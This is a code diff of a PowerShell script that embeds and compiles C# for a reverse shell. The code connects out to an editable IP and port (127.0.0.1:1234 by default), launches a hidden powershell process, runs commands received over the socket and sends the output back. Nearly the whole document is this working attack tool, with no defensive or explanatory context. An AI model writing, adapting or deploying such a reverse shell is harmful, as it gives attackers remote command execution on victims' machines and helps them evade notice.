@@ -1,4 +1,15 @@
-@"
+# Powershell reverse shell with C# 
+
+#EEDIT IP & PORT
+$ip = "127.0.0.1"
+$port = "1234"
+$shell = "powershell"
+
+#random number, for dev purposes
+$id = get-random
+
+#C# sharp code
+$code = @"
 
 using System;
 using System.Text;
@@ -9,65 +20,63 @@ using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 
-
-namespace ConnectBack
+namespace TestReverseShell
 {
-	public class Program
+	public class ReverseShell$id
 	{
-		static StreamWriter streamWriter;
+        static StreamWriter streamWriter;
 
 		public static void Main(string[] args)
 		{
-			using(TcpClient client = new TcpClient("127.0.0.1", 1234))
-			{
-				using(Stream stream = client.GetStream())
-				{
-					using(StreamReader rdr = new StreamReader(stream))
-					{
-						streamWriter = new StreamWriter(stream);
-						
-						StringBuilder strInput = new StringBuilder();
+			using (TcpClient client = new TcpClient(args[0],int.Parse(args[1]))) {
+				using (Stream stream = client.GetStream()) {
+					using (StreamReader rdr = new StreamReader(stream)) {
 
-						Process p = new Process();
-						p.StartInfo.FileName = "powershell";
-						p.StartInfo.CreateNoWindow = true;
-						p.StartInfo.UseShellExecute = false;
-						p.StartInfo.RedirectStandardOutput = true;
-						p.StartInfo.RedirectStandardInput = true;
-						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-						p.Start();
-						p.BeginOutputReadLine();
+                        streamWriter = new StreamWriter(stream);
 
-						while(true)
-						{
-							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
-							p.StandardInput.WriteLine(strInput);
-							strInput.Remove(0, strInput.Length);
-						}
+                        StringBuilder strInput = new StringBuilder();
+
+                        Process p = new Process();
+                        p.StartInfo.FileName                 = "$shell";
+                        p.StartInfo.CreateNoWindow           = true;
+                        p.StartInfo.UseShellExecute          = false;
+                        p.StartInfo.RedirectStandardOutput   = true;
+                        p.StartInfo.RedirectStandardInput    = true;
+                        p.StartInfo.RedirectStandardError    = true;
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputHandler);
+                        p.Start();
+                        p.BeginOutputReadLine();
+
+                        while(true)
+                        {
+                            strInput.Append(rdr.ReadLine());
+                            p.StandardInput.WriteLine(strInput);
+                            strInput.Remove(0,strInput.Length);
+                        }
+
 					}
 				}
 			}
 		}
 
-		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        public static void CmdOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
             StringBuilder strOutput = new StringBuilder();
-
             if (!String.IsNullOrEmpty(outLine.Data))
             {
-                try
-                {
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
-                    streamWriter.Flush();
-                }
-                catch (Exception err) { }
+                strOutput.Append(outLine.Data);
+                streamWriter.WriteLine(strOutput);
+                streamWriter.Flush();
             }
         }
-
-	}
+    }
 }
 
-"@
+
+
+"@;
+
+Add-Type -Language CSharp $code
+#[ReverseShell]::Main("127.0.0.1","1234")
+Invoke-Expression "[TestReverseShell.ReverseShell$id]::Main(($ip,$port));"
+```
